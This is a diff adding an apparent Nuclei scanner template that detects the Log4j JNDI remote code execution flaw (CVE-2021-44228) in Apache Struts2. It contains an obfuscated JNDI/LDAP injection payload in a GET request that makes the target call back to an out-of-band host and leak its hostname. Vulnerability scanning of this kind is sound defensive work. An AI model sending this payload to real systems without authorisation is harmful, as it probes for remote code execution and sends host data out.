@@ -1,0 +1,36 @@
+id: apache-struts2-log4j-jndi-rce
+
+info:
+  name: Apache Struts2 Log4j JNDI RCE
+  author: For3stCo1d
+  severity: high
+  description: A critical vulnerability in Apache Log4j identified by CVE-2021-44228 has been publicly disclosed that may allow for remote code execution in impacted Apache Struts2.
+  reference:
+    - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
+    - https://twitter.com/sirifu4k1/status/1470946544908185603
+  tags: rce,jndi,log4j,struts2
+
+requests:
+  - raw:
+      - |
+        GET /struts2-showcase/$%7Bjndi:ldap:$%7B::-/%7D/${hostName}.{{interactsh-url}}}/abc%7D/ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '([a-z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Match for extracted ${hostName} variable
+
+    extractors:
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '([a-z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
